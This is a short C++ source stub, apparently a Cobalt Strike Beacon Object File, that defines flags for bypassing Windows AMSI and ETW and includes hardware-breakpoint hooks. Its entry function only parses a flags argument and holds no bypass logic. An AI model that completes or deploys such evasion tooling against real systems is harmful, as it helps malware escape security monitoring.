#include <General.hpp>
#include <Hooks/Hwbp.cc>

#define BYPASS_AMSI 0x400
#define BYPASS_ETW  0x100

EXTERN_C
auto go( CHAR* Args, INT32 Argc ) -> VOID {
    Data Parser = { 0 };

    ULONG BypassFlags = BeaconDataInt( &Parser );

    
}